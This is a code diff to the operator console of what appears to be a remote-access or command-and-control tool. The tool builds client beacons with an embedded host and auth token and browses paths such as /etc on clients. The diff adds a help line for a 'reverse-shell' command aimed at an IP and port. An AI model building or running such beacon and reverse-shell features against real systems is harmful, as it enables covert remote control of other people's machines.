@@ -25,6 +25,7 @@ from server.common import write_frame, read_frame
 from server.go_builder import build_go_clients
 from server.UI import *
 
+__version__ = "2.1"
 
 # ---------- wire ----------
 async def admin_send(
@@ -99,7 +100,7 @@ def build_repl_parser() -> Tuple[
 
     sp = sub.add_parser("session", help="Fetch session info from client")
     sp.add_argument("--client", required=False)
-    sp.add_argument("--timeout", type=float, default=5.0)
+    sp.add_argument("--timeout", type=float, default=1)
 
     # build-client (REPL)
     sp = sub.add_parser(
@@ -179,7 +180,7 @@ async def run_repl(args) -> None:
     ui = UI(
         use_color=(not args.no_color), show_banner=(not args.no_banner), quiet=False
     )
-    ui.banner()
+    ui.banner(__version__)
 
     repl_parser, sub_map = build_repl_parser()
     commands = sorted([k for k in sub_map.keys() if k not in {"help"}]) + [
@@ -201,6 +202,7 @@ async def run_repl(args) -> None:
         "  >> list --path /etc --wait       # also uses active client\n"
         "  >> unuse                         # clear active client\n"
         "  >> build-client --server-host 10.0.0.5 --server-port 9000 --build-auth-token supersecret # build client beacons\n"
+        "  >> reverse-shell 10.0.0.5:5555  # start a reverse shell to the given IP/port\n"
     )
 
     while True:
@@ -245,7 +247,7 @@ async def run_repl(args) -> None:
             ui.rule()
             continue
 
-        if line.lower() in {"quit", "exit"}:
+        if line.lower() in {"quit", "exit", "ciao", "bisous"}:
             print(ui.TAG_INF, "Goodbye.")
             return
 
@@ -789,12 +791,12 @@ async def main():
     bp.add_argument(
         "--server-port",
         type=int,
-        help="Server port to embed (default: --port)",
+        help="Server port to embed",
         default=None,
     )
     bp.add_argument(
         "--build-auth-token",
-        help="Auth token to embed (default: --auth-token)",
+        help="Auth token to embed",
         default=None,
     )
     bp.add_argument(
